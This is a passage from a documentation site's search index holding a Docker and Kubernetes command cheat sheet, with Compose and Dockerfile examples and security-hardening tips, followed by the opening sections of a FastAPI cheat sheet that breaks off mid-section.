https://www.docker.com/products/docker-desktop/\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#windows","title":"Windows","text":"<pre><code># Via Chocolatey\nchoco install docker-desktop\n\n# Or download Docker Desktop\n# https://www.docker.com/products/docker-desktop/\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#post-installation-linux","title":"Post-installation Linux","text":"<pre><code># Add user to docker group\nsudo usermod -aG docker $USER\nnewgrp docker\n\n# Verify installation\ndocker --version\ndocker run hello-world\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#basic-commands","title":"Basic Commands","text":""},{"location":"cheat-sheet/docker/docker/#information-and-help","title":"Information and Help","text":"<pre><code># Docker version\ndocker --version\ndocker version\n\n# System information\ndocker info\ndocker system info\n\n# Help on a command\ndocker COMMAND --help\ndocker run --help\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#image-management","title":"Image Management","text":""},{"location":"cheat-sheet/docker/docker/#search-and-download","title":"Search and Download","text":"<pre><code># Search for an image\ndocker search nginx\ndocker search --filter stars=100 nginx\n\n# Download an image\ndocker pull nginx\ndocker pull nginx:1.25\ndocker pull nginx:alpine\n\n# Download from a private registry\ndocker pull registry.example.com/nginx:latest\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#list-and-inspect","title":"List and Inspect","text":"<pre><code># List images\ndocker images\ndocker image ls\ndocker image ls -a\n\n# Filter images\ndocker images --filter \"dangling=true\"\ndocker images --filter \"reference=nginx:*\"\n\n# Display image details\ndocker image inspect nginx\ndocker image inspect nginx:alpine --format '{{.Architecture}}'\n\n# Image history\ndocker history nginx\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#create-and-manage","title":"Create and Manage","text":"<pre><code># Build an image from a Dockerfile\ndocker build -t mon-app:1.0 .\ndocker build -t mon-app:latest -f Dockerfile.prod .\ndocker build --no-cache -t mon-app:1.0 .\n\n# Tag an image\ndocker tag mon-app:1.0 mon-app:latest\ndocker tag mon-app:1.0 registry.example.com/mon-app:1.0\n\n# Save/Load an image\ndocker save mon-app:1.0 -o mon-app.tar\ndocker load -i mon-app.tar\n\n# Export/Import from a container\ndocker export mon-conteneur -o mon-conteneur.tar\ndocker import mon-conteneur.tar mon-app:imported\n\n# Remove images\ndocker rmi nginx\ndocker rmi $(docker images -q -f \"dangling=true\")\ndocker image prune\ndocker image prune -a\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#publish-images","title":"Publish Images","text":"<pre><code># Log in to Docker Hub\ndocker login\ndocker login registry.example.com\n\n# Push an image\ndocker push mon-app:1.0\ndocker push registry.example.com/mon-app:1.0\n\n# Log out\ndocker logout\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#container-management","title":"Container Management","text":""},{"location":"cheat-sheet/docker/docker/#running-containers","title":"Running Containers","text":"<pre><code># Run a simple container\ndocker run nginx\ndocker run -d nginx                    # Detached mode\ndocker run -it ubuntu /bin/bash        # Interactive mode\n\n# Name a container\ndocker run --name mon-nginx -d nginx\n\n# Port mapping\ndocker run -p 8080:80 nginx            # Host:Container\ndocker run -p 127.0.0.1:8080:80 nginx  # Specify interface\ndocker run -P nginx                    # All exposed ports\n\n# Environment variables\ndocker run -e \"MYSQL_ROOT_PASSWORD=secret\" mysql\ndocker run --env-file .env mon-app\n\n# Resource limits\ndocker run -m 512m nginx               # Max memory\ndocker run --cpus=\".5\" nginx           # 50% of one CPU\ndocker run --memory=512m --cpus=1 nginx\n\n# Volumes and mounts\ndocker run -v /host/path:/container/path nginx\ndocker run -v mon-volume:/data nginx\ndocker run --mount type=bind,source=/host/path,target=/container/path nginx\ndocker run --mount type=volume,source=mon-volume,target=/data nginx\n\n# Network\ndocker run --network mon-reseau nginx\ndocker run --network host nginx\n\n# Automatic restart\ndocker run --restart unless-stopped nginx\ndocker run --restart on-failure:3 nginx\n\n# Automatically remove after stop\ndocker run --rm busybox echo \"Hello\"\n\n# Specific user\ndocker run -u 1000:1000 nginx\ndocker run --user $(id -u):$(id -g) nginx\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#lifecycle-management","title":"Lifecycle Management","text":"<pre><code># List containers\ndocker ps                              # Active containers\ndocker ps -a                           # All containers\ndocker ps -a --filter \"status=exited\"\ndocker ps --format \"table {{.Names}}\\t{{.Status}}\\t{{.Ports}}\"\n\n# Start/Stop\ndocker start mon-conteneur\ndocker stop mon-conteneur\ndocker restart mon-conteneur\ndocker pause mon-conteneur\ndocker unpause mon-conteneur\n\n# Kill a container\ndocker kill mon-conteneur\ndocker kill --signal=HUP mon-conteneur\n\n# Remove containers\ndocker rm mon-conteneur\ndocker rm -f mon-conteneur             # Force removal\ndocker rm $(docker ps -a -q)           # All containers\ndocker container prune                 # Stopped containers\ndocker container prune --filter \"until=24h\"\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#inspection-and-logs","title":"Inspection and Logs","text":"<pre><code># Inspect a container\ndocker inspect mon-conteneur\ndocker inspect mon-conteneur --format '{{.State.Status}}'\ndocker inspect mon-conteneur --format '{{.NetworkSettings.IPAddress}}'\n\n# View logs\ndocker logs mon-conteneur\ndocker logs -f mon-conteneur           # Follow in real-time\ndocker logs --tail 100 mon-conteneur   # Last 100 lines\ndocker logs --since 10m mon-conteneur  # Since 10 minutes ago\ndocker logs --timestamps mon-conteneur\n\n# Real-time statistics\ndocker stats\ndocker stats mon-conteneur\ndocker stats --no-stream               # Snapshot\n\n# Processes in the container\ndocker top mon-conteneur\ndocker top mon-conteneur aux\n\n# Docker events\ndocker events\ndocker events --filter \"container=mon-conteneur\"\ndocker events --since '2024-01-01'\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#interaction-with-containers","title":"Interaction with Containers","text":"<pre><code># Execute a command in a container\ndocker exec mon-conteneur ls /app\ndocker exec -it mon-conteneur /bin/bash\ndocker exec -it mon-conteneur sh\ndocker exec -u root -it mon-conteneur bash\n\n# Copy files\ndocker cp mon-conteneur:/app/file.txt ./file.txt\ndocker cp ./file.txt mon-conteneur:/app/file.txt\ndocker cp ./config/ mon-conteneur:/etc/app/\n\n# Attach to container\ndocker attach mon-conteneur\n\n# Update configuration\ndocker update --memory 1g mon-conteneur\ndocker update --restart unless-stopped mon-conteneur\n\n# Rename a container\ndocker rename ancien-nom nouveau-nom\n\n# View filesystem changes\ndocker diff mon-conteneur\n\n# Create an image from a container\ndocker commit mon-conteneur mon-nouvelle-image:1.0\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#volume-management","title":"Volume Management","text":""},{"location":"cheat-sheet/docker/docker/#creation-and-management","title":"Creation and Management","text":"<pre><code># Create a volume\ndocker volume create mon-volume\ndocker volume create --driver local mon-volume\n\n# List volumes\ndocker volume ls\ndocker volume ls --filter \"dangling=true\"\n\n# Inspect a volume\ndocker volume inspect mon-volume\n\n# Remove volumes\ndocker volume rm mon-volume\ndocker volume prune\ndocker volume prune --filter \"label!=keep\"\n\n# Use volumes\ndocker run -v mon-volume:/data nginx\ndocker run --mount source=mon-volume,target=/data nginx\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#named-vs-anonymous-volumes","title":"Named vs Anonymous Volumes","text":"<pre><code># Named volume (persistent)\ndocker run -v mon-volume:/data nginx\n\n# Anonymous volume (automatically generated)\ndocker run -v /data nginx\n\n# Bind mount (bind a host directory)\ndocker run -v /host/path:/container/path nginx\ndocker run -v $(pwd):/app mon-app\n\n# Read-only volume\ndocker run -v mon-volume:/data:ro nginx\ndocker run -v /host/path:/container/path:ro nginx\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#network-management","title":"Network Management","text":""},{"location":"cheat-sheet/docker/docker/#creation-and-configuration","title":"Creation and Configuration","text":"<pre><code># List networks\ndocker network ls\n\n# Create a network\ndocker network create mon-reseau\ndocker network create --driver bridge mon-reseau\ndocker network create --subnet=192.168.1.0/24 mon-reseau\n\n# Inspect a network\ndocker network inspect mon-reseau\ndocker network inspect bridge\n\n# Connect/Disconnect a container\ndocker network connect mon-reseau mon-conteneur\ndocker network disconnect mon-reseau mon-conteneur\n\n# Remove networks\ndocker network rm mon-reseau\ndocker network prune\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#network-types","title":"Network Types","text":"<pre><code># Bridge (default)\ndocker run --network bridge nginx\n\n# Host (use host's network)\ndocker run --network host nginx\n\n# None (no network)\ndocker run --network none nginx\n\n# Custom network with DNS\ndocker network create --driver bridge app-network\ndocker run --network app-network --name db postgres\ndocker run --network app-network --name web nginx\n# 'web' can access 'db' via the hostname 'db'\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#docker-compose","title":"Docker Compose","text":""},{"location":"cheat-sheet/docker/docker/#docker-composeyml-file","title":"docker-compose.yml File","text":"<pre><code>version: '3.8'\n\nservices:\n  web:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    image: mon-app:latest\n    container_name: web-app\n    ports:\n      - \"8080:80\"\n    environment:\n      - NODE_ENV=production\n      - DATABASE_URL=postgresql://db:5432/mydb\n    env_file:\n      - .env\n    volumes:\n      - ./app:/usr/src/app\n      - node_modules:/usr/src/app/node_modules\n    networks:\n      - app-network\n    depends_on:\n      - db\n      - redis\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n      start_period: 40s\n    deploy:\n      resources:\n        limits:\n          cpus: '0.5'\n          memory: 512M\n        reservations:\n          cpus: '0.25'\n          memory: 256M\n\n  db:\n    image: postgres:15-alpine\n    container_name: postgres-db\n    environment:\n      POSTGRES_DB: mydb\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: password\n    volumes:\n      - postgres-data:/var/lib/postgresql/data\n      - ./init.sql:/docker-entrypoint-initdb.d/init.sql\n    networks:\n      - app-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U user\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  redis:\n    image: redis:7-alpine\n    container_name: redis-cache\n    command: redis-server --appendonly yes\n    volumes:\n      - redis-data:/data\n    networks:\n      - app-network\n    restart: unless-stopped\n\n  nginx:\n    image: nginx:alpine\n    container_name: nginx-proxy\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro\n      - ./nginx/ssl:/etc/nginx/ssl:ro\n    networks:\n      - app-network\n    depends_on:\n      - web\n    restart: unless-stopped\n\nvolumes:\n  postgres-data:\n  redis-data:\n  node_modules:\n\nnetworks:\n  app-network:\n    driver: bridge\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#docker-compose-commands","title":"Docker Compose Commands","text":"<pre><code># Start services\ndocker compose up\ndocker compose up -d                   # Detached mode\ndocker compose up --build              # Rebuild images\ndocker compose up --force-recreate     # Recreate containers\n\n# Stop services\ndocker compose down\ndocker compose down -v                 # Remove volumes too\ndocker compose down --rmi all          # Remove images too\n\n# Manage services\ndocker compose start\ndocker compose stop\ndocker compose restart\ndocker compose pause\ndocker compose unpause\n\n# List services\ndocker compose ps\ndocker compose ps -a\n\n# View logs\ndocker compose logs\ndocker compose logs -f                 # Follow\ndocker compose logs -f web             # Specific service\ndocker compose logs --tail=100 web\n\n# Execute a command\ndocker compose exec web sh\ndocker compose exec db psql -U user mydb\n\n# Build images\ndocker compose build\ndocker compose build --no-cache\ndocker compose build web\n\n# Scale services\ndocker compose up -d --scale web=3\n\n# Validate configuration\ndocker compose config\ndocker compose config --quiet\n\n# View events\ndocker compose events\ndocker compose events --json\n\n# Pull images\ndocker compose pull\n\n# Create containers without starting them\ndocker compose create\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#dockerfile-best-practices","title":"Dockerfile - Best Practices","text":""},{"location":"cheat-sheet/docker/docker/#basic-structure","title":"Basic Structure","text":"<pre><code># Base image\nFROM node:18-alpine AS base\n\n# Metadata\nLABEL maintainer=\"admin@example.com\"\nLABEL version=\"1.0\"\nLABEL description=\"Node.js Application\"\n\n# Environment variables\nENV NODE_ENV=production \\\n    PORT=3000 \\\n    APP_HOME=/usr/src/app\n\n# Working directory\nWORKDIR ${APP_HOME}\n\n# Non-root user\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\n# Copy dependency files\nCOPY package*.json ./\n\n# Install dependencies\nRUN npm ci --only=production &amp;&amp; \\\n    npm cache clean --force\n\n# Copy source code\nCOPY --chown=nodejs:nodejs . .\n\n# Expose port\nEXPOSE ${PORT}\n\n# Switch to non-root user\nUSER nodejs\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=30s --retries=3 \\\n  CMD node healthcheck.js\n\n# Default command\nCMD [\"node\", \"server.js\"]\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#multi-stage-build","title":"Multi-Stage Build","text":"<pre><code># Stage 1: Builder\nFROM node:18-alpine AS builder\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\nCOPY . .\nRUN npm run build &amp;&amp; \\\n    npm prune --production\n\n# Stage 2: Production\nFROM node:18-alpine AS production\n\nWORKDIR /app\n\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\nCOPY --from=builder --chown=nodejs:nodejs /app/dist ./dist\nCOPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules\nCOPY --chown=nodejs:nodejs package*.json ./\n\nUSER nodejs\n\nEXPOSE 3000\n\nCMD [\"node\", \"dist/server.js\"]\n\n# Stage 3: Development\nFROM node:18 AS development\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm install\n\nCOPY . .\n\nUSER node\n\nEXPOSE 3000 9229\n\nCMD [\"npm\", \"run\", \"dev\"]\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#layer-optimization","title":"Layer Optimization","text":"<pre><code># \u274c Bad - Creates multiple layers\nRUN apt-get update\nRUN apt-get install -y curl\nRUN apt-get install -y git\nRUN apt-get clean\n\n# \u2705 Good - Single layer\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y \\\n        curl \\\n        git \\\n    &amp;&amp; apt-get clean &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n# \u274c Bad - COPY invalidates cache on every change\nCOPY . .\nRUN npm install\n\n# \u2705 Good - Uses Docker cache efficiently\nCOPY package*.json ./\nRUN npm install\nCOPY . .\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#docker-system-commands","title":"Docker System Commands","text":""},{"location":"cheat-sheet/docker/docker/#cleanup-and-maintenance","title":"Cleanup and Maintenance","text":"<pre><code># View disk usage\ndocker system df\ndocker system df -v\n\n# Clean up all unused resources\ndocker system prune\ndocker system prune -a                 # Unused images too\ndocker system prune -a --volumes       # Volumes too\ndocker system prune --filter \"until=24h\"\n\n# System events\ndocker system events\ndocker system events --since '1h'\ndocker system events --filter 'type=container'\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#registry-and-images","title":"Registry and Images","text":"<pre><code># Log in to a registry\ndocker login\ndocker login registry.example.com\ndocker login -u username -p password registry.example.com\n\n# Push/Pull from a private registry\ndocker tag mon-app:1.0 registry.example.com/mon-app:1.0\ndocker push registry.example.com/mon-app:1.0\ndocker pull registry.example.com/mon-app:1.0\n\n# Start a local registry\ndocker run -d -p 5000:5000 --name registry registry:2\ndocker tag mon-app:1.0 localhost:5000/mon-app:1.0\ndocker push localhost:5000/mon-app:1.0\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#security","title":"Security","text":""},{"location":"cheat-sheet/docker/docker/#best-practices","title":"Best Practices","text":"<pre><code># Analyze an image with Docker Scout\ndocker scout cves nginx:latest\ndocker scout quickview nginx:latest\n\n# Don't use root\n# In the Dockerfile\nRUN adduser -D appuser\nUSER appuser\n\n# Limit capabilities\ndocker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx\n\n# Read-only mode\ndocker run --read-only --tmpfs /tmp nginx\n\n# Limit resources\ndocker run -m 512m --cpus=\"0.5\" --pids-limit 100 nginx\n\n# Secrets (with Docker Swarm or Compose)\necho \"my_secret_password\" | docker secret create db_password -\ndocker service create --secret db_password postgres\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#vulnerability-scanning","title":"Vulnerability Scanning","text":"<pre><code># With Trivy\ntrivy image nginx:latest\ntrivy image --severity HIGH,CRITICAL mon-app:1.0\n\n# With Snyk\nsnyk container test nginx:latest\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#kubernetes-k9s-kubectl","title":"Kubernetes (k9s &amp; kubectl)","text":""},{"location":"cheat-sheet/docker/docker/#k9s-tui-interface-for-kubernetes","title":"K9s - TUI Interface for Kubernetes","text":"<pre><code># Launch K9s\nk9s\n\n# Main commands\n:pod         # View pods\n:deploy      # View deployments\n:svc         # View services\n:ns          # Change namespace\n\n# Keyboard shortcuts\nd            # Describe resource\nl            # View logs\ns            # Shell into pod\nCtrl+d       # Delete\n?            # Help\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#kubectl-kubernetes-cli","title":"Kubectl - Kubernetes CLI","text":"<pre><code># Configuration\nkubectl config view\nkubectl config get-contexts\nkubectl config use-context mon-contexte\nkubectl config set-context --current --namespace=mon-namespace\n\n# Pods\nkubectl get pods\nkubectl get pods -o wide\nkubectl describe pod mon-pod\nkubectl logs mon-pod\nkubectl logs -f mon-pod\nkubectl exec -it mon-pod -- /bin/bash\n\n# Deployments\nkubectl get deployments\nkubectl create deployment nginx --image=nginx:1.25\nkubectl scale deployment nginx --replicas=3\nkubectl rollout status deployment/nginx\nkubectl rollout undo deployment/nginx\n\n# Services\nkubectl get services\nkubectl expose deployment nginx --port=80 --target-port=80\nkubectl port-forward service/nginx 8080:80\n\n# Apply manifests\nkubectl apply -f deployment.yaml\nkubectl apply -f ./manifests/\nkubectl delete -f deployment.yaml\n\n# Debugging\nkubectl describe pod mon-pod\nkubectl get events\nkubectl top pods\nkubectl top nodes\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#complete-practical-examples","title":"Complete Practical Examples","text":""},{"location":"cheat-sheet/docker/docker/#web-application-with-database","title":"Web Application with Database","text":"<pre><code># docker-compose.yml\nversion: '3.8'\n\nservices:\n  app:\n    build: .\n    ports:\n      - \"3000:3000\"\n    environment:\n      - DATABASE_URL=postgresql://postgres:password@db:5432/myapp\n      - REDIS_URL=redis://redis:6379\n    depends_on:\n      db:\n        condition: service_healthy\n      redis:\n        condition: service_started\n    volumes:\n      - ./app:/usr/src/app\n    networks:\n      - app-network\n\n  db:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_DB: myapp\n      POSTGRES_PASSWORD: password\n    volumes:\n      - postgres-data:/var/lib/postgresql/data\n    networks:\n      - app-network\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  redis:\n    image: redis:7-alpine\n    networks:\n      - app-network\n\n  nginx:\n    image: nginx:alpine\n    ports:\n      - \"80:80\"\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n    depends_on:\n      - app\n    networks:\n      - app-network\n\nvolumes:\n  postgres-data:\n\nnetworks:\n  app-network:\n    driver: bridge\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#monitoring-application","title":"Monitoring Application","text":"<pre><code>version: '3.8'\n\nservices:\n  prometheus:\n    image: prom/prometheus:latest\n    ports:\n      - \"9090:9090\"\n    volumes:\n      - ./prometheus.yml:/etc/prometheus/prometheus.yml\n      - prometheus-data:/prometheus\n    command:\n      - '--config.file=/etc/prometheus/prometheus.yml'\n      - '--storage.tsdb.path=/prometheus'\n    networks:\n      - monitoring\n\n  grafana:\n    image: grafana/grafana:latest\n    ports:\n      - \"3000:3000\"\n    environment:\n      - GF_SECURITY_ADMIN_PASSWORD=admin\n    volumes:\n      - grafana-data:/var/lib/grafana\n    depends_on:\n      - prometheus\n    networks:\n      - monitoring\n\n  node-exporter:\n    image: prom/node-exporter:latest\n    ports:\n      - \"9100:9100\"\n    networks:\n      - monitoring\n\nvolumes:\n  prometheus-data:\n  grafana-data:\n\nnetworks:\n  monitoring:\n    driver: bridge\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#troubleshooting","title":"Troubleshooting","text":""},{"location":"cheat-sheet/docker/docker/#common-issues","title":"Common Issues","text":"<pre><code># Container won't start\ndocker logs mon-conteneur\ndocker inspect mon-conteneur\ndocker events --filter container=mon-conteneur\n\n# Network issues\ndocker network inspect bridge\ndocker exec mon-conteneur ping autre-conteneur\ndocker exec mon-conteneur nslookup autre-conteneur\n\n# Permission issues\ndocker exec -u root mon-conteneur chown -R appuser:appuser /data\n\n# Disk space\ndocker system df\ndocker system prune -a\ndocker volume prune\n\n# Performance\ndocker stats\ndocker top mon-conteneur\ndocker inspect --format='{{.State.Pid}}' mon-conteneur\nhtop -p $(docker inspect --format='{{.State.Pid}}' mon-conteneur)\n</code></pre>"},{"location":"cheat-sheet/docker/docker/#resources","title":"Resources","text":"<ul> <li>Official Documentation: https://docs.docker.com/</li> <li>Docker Hub: https://hub.docker.com/</li> <li>Docker Compose: https://docs.docker.com/compose/</li> <li>Dockerfile Best Practices: https://docs.docker.com/develop/develop-images/dockerfile_best-practices/</li> <li>Docker Security: https://docs.docker.com/engine/security/</li> <li>Kubernetes: https://kubernetes.io/docs/</li> </ul> <p>This Docker guide covers essential and advanced commands for efficiently managing your containers, images, volumes, and networks. Mastering these commands will make you more productive in your deployments and containerized application management.</p>"},{"location":"cheat-sheet/fastapi/fastapi/","title":"FastAPI Cheat Sheet","text":""},{"location":"cheat-sheet/fastapi/fastapi/#overview","title":"Overview","text":"<p>FastAPI is a modern, high-performance web framework for building APIs with Python based on standard Python type hints.</p> <p>Key Features: - Fast performance (comparable to NodeJS and Go) - Easy to learn and use - Automatic interactive API documentation (Swagger UI &amp; ReDoc) - Built-in data validation with Pydantic - Async/await support - Type hints for editor support</p>"},{"location":"cheat-sheet/fastapi/fastapi/#installation","title":"Installation","text":""},{"location":"cheat-sheet/fastapi/fastapi/#basic-installation","title":"Basic Installation","text":"<pre><code>pip install fastapi\n\n# Also install ASGI server (Uvicorn)\npip install \"uvicorn[standard]\"\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#with-optional-dependencies","title":"With Optional Dependencies","text":"<pre><code># Complete installation with all optional dependencies\npip install \"fastapi[all]\"\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#requirements-file","title":"Requirements File","text":"<pre><code>fastapi==0.110.0\nuvicorn[standard]==0.27.0\npydantic==2.6.0\npython-multipart==0.0.9  # For form data\npython-jose[cryptography]==3.3.0  # For JWT\npasslib[bcrypt]==1.7.4  # For password hashing\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#basic-application","title":"Basic Application","text":""},{"location":"cheat-sheet/fastapi/fastapi/#minimal-example","title":"Minimal Example","text":"<pre><code>from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/\")\ndef read_root():\n    return {\"message\": \"Hello World\"}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#run-the-application","title":"Run the Application","text":"<pre><code># Development server with auto-reload\nuvicorn main:app --reload\n\n# Specify host and port\nuvicorn main:app --host 0.0.0.0 --port 8000 --reload\n\n# Production\nuvicorn main:app --workers 4\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#access-documentation","title":"Access Documentation","text":"<ul> <li>Swagger UI: http://localhost:8000/docs</li> <li>ReDoc: http://localhost:8000/redoc</li> <li>OpenAPI schema: http://localhost:8000/openapi.json</li> </ul>"},{"location":"cheat-sheet/fastapi/fastapi/#path-operations","title":"Path Operations","text":""},{"location":"cheat-sheet/fastapi/fastapi/#http-methods","title":"HTTP Methods","text":"<pre><code>from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/items\")\ndef read_items():\n    return {\"method\": \"GET\"}\n\n@app.post(\"/items\")\ndef create_item():\n    return {\"method\": \"POST\"}\n\n@app.put(\"/items/{item_id}\")\ndef update_item(item_id: int):\n    return {\"method\": \"PUT\", \"item_id\": item_id}\n\n@app.patch(\"/items/{item_id}\")\ndef partial_update_item(item_id: int):\n    return {\"method\": \"PATCH\", \"item_id\": item_id}\n\n@app.delete(\"/items/{item_id}\")\ndef delete_item(item_id: int):\n    return {\"method\": \"DELETE\", \"item_id\": item_id}\n\n@app.options(\"/items\")\ndef options_items():\n    return {\"method\": \"OPTIONS\"}\n\n@app.head(\"/items\")\ndef head_items():\n    return {\"method\": \"HEAD\"}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#path-parameters","title":"Path Parameters","text":"<pre><code>@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int):\n    return {\"item_id\": item_id}\n\n# With type validation\n@app.get(\"/users/{user_id}\")\ndef read_user(user_id: int):\n    return {\"user_id\": user_id}\n\n# String path parameter\n@app.get(\"/items/{item_name}\")\ndef read_item_by_name(item_name: str):\n    return {\"item_name\": item_name}\n\n# Enum path parameter\nfrom enum import Enum\n\nclass ModelName(str, Enum):\n    alexnet = \"alexnet\"\n    resnet = \"resnet\"\n    lenet = \"lenet\"\n\n@app.get(\"/models/{model_name}\")\ndef get_model(model_name: ModelName):\n    if model_name == ModelName.alexnet:\n        return {\"model_name\": model_name, \"message\": \"Deep Learning\"}\n    return {\"model_name\": model_name}\n\n# Path parameter with path\n@app.get(\"/files/{file_path:path}\")\ndef read_file(file_path: str):\n    return {\"file_path\": file_path}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#query-parameters","title":"Query Parameters","text":"<pre><code>from typing import Optional\n\n# Optional query parameter\n@app.get(\"/items/\")\ndef read_items(skip: int = 0, limit: int = 10):\n    return {\"skip\": skip, \"limit\": limit}\n\n# Optional with None default\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int, q: Optional[str] = None):\n    if q:\n        return {\"item_id\": item_id, \"q\": q}\n    return {\"item_id\": item_id}\n\n# Required query parameter\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int, q: str):\n    return {\"item_id\": item_id, \"q\": q}\n\n# Boolean query parameter\n@app.get(\"/items/\")\ndef read_items(skip: int = 0, limit: int = 10, short: bool = False):\n    items = [{\"item_id\": i} for i in range(skip, skip + limit)]\n    if short:\n        return {\"items\": items}\n    return {\"items\": items, \"total\": 100}\n\n# Multiple query parameters\n@app.get(\"/items/\")\ndef read_items(\n    skip: int = 0,\n    limit: int = 10,\n    q: Optional[str] = None,\n    sort: Optional[str] = None\n):\n    return {\"skip\": skip, \"limit\": limit, \"q\": q, \"sort\": sort}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#request-body","title":"Request Body","text":""},{"location":"cheat-sheet/fastapi/fastapi/#pydantic-models","title":"Pydantic Models","text":"<pre><code>from pydantic import BaseModel, Field\nfrom typing import Optional\n\nclass Item(BaseModel):\n    name: str\n    description: Optional[str] = None\n    price: float\n    tax: Optional[float] = None\n\n@app.post(\"/items/\")\ndef create_item(item: Item):\n    return {\"item\": item}\n\n# With Field validation\nclass ItemValidated(BaseModel):\n    name: str = Field(..., min_length=1, max_length=50)\n    description: Optional[str] = Field(None, max_length=300)\n    price: float = Field(..., gt=0, description=\"Price must be greater than 0\")\n    tax: Optional[float] = Field(None, ge=0, le=100)\n\n@app.post(\"/items-validated/\")\ndef create_validated_item(item: ItemValidated):\n    return {\"item\": item}\n\n# Nested models\nclass Image(BaseModel):\n    url: str\n    name: str\n\nclass ItemWithImages(BaseModel):\n    name: str\n    description: Optional[str] = None\n    price: float\n    images: Optional[list[Image]] = None\n\n@app.post(\"/items-with-images/\")\ndef create_item_with_images(item: ItemWithImages):\n    return {\"item\": item}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#multiple-body-parameters","title":"Multiple Body Parameters","text":"<pre><code>from pydantic import BaseModel\n\nclass Item(BaseModel):\n    name: str\n    price: float\n\nclass User(BaseModel):\n    username: str\n    email: str\n\n@app.put(\"/items/{item_id}\")\ndef update_item(item_id: int, item: Item, user: User):\n    return {\"item_id\": item_id, \"item\": item, \"user\": user}\n\n# Body with singular value\nfrom fastapi import Body\n\n@app.put(\"/items/{item_id}\")\ndef update_item(\n    item_id: int,\n    item: Item,\n    user: User,\n    importance: int = Body(...)\n):\n    return {\"item_id\": item_id, \"item\": item, \"user\": user, \"importance\": importance}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#validation","title":"Validation","text":""},{"location":"cheat-sheet/fastapi/fastapi/#query-parameter-validation","title":"Query Parameter Validation","text":"<pre><code>from fastapi import Query\nfrom typing import Optional, List\n\n# String validation\n@app.get(\"/items/\")\ndef read_items(\n    q: Optional[str] = Query(None, min_length=3, max_length=50)\n):\n    return {\"q\": q}\n\n# Regex validation\n@app.get(\"/items/\")\ndef read_items(\n    q: Optional[str] = Query(None, regex=\"^fixedquery$\")\n):\n    return {\"q\": q}\n\n# List query parameters\n@app.get(\"/items/\")\ndef read_items(\n    q: Optional[List[str]] = Query(None)\n):\n    return {\"q\": q}\n\n# Required query parameter\n@app.get(\"/items/\")\ndef read_items(\n    q: str = Query(..., min_length=3)\n):\n    return {\"q\": q}\n\n# With metadata\n@app.get(\"/items/\")\ndef read_items(\n    q: Optional[str] = Query(\n        None,\n        title=\"Query string\",\n        description=\"Query string for searching items\",\n        min_length=3,\n        max_length=50,\n        deprecated=False\n    )\n):\n    return {\"q\": q}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#path-parameter-validation","title":"Path Parameter Validation","text":"<pre><code>from fastapi import Path\n\n@app.get(\"/items/{item_id}\")\ndef read_item(\n    item_id: int = Path(..., title=\"The ID of the item\", ge=1, le=1000)\n):\n    return {\"item_id\": item_id}\n\n# Numeric 